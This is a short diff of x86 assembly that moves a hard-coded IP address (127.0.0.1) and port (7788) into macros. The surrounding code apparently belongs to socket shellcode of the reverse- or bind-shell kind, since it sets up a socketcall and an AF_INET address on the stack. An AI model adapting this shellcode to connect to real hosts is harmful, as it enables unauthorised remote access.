@@ -4,7 +4,9 @@
 	;; reduce(lambda a,b:b+a,(map(lambda a:hex(a)[2:].zfill(2),[int(i) for i in '127.0.0.1'.split('.')])))
 	;; port is littleEndian
 
-	BITS 32
+%define IP dword 0x0100007f	;IP 127.0.0.1 Little Endian
+%define PORT word  0x6c1e	;port 7788 Little Endian
+BITS 32
 	global main
 main:
 	xor eax,eax
@@ -22,8 +24,8 @@ main:
 	mov al,0x66
 	inc ebx
 IPandPort:	
-	push dword 0x0100007f	;IP 127.0.0.1 Little Endian
-	push word  0x6c1e	;port 7788 Little Endian
+	push IP
+	push PORT
 	push bx 		;bx=2 AF_INET
 	mov ecx,esp
 	push byte 16
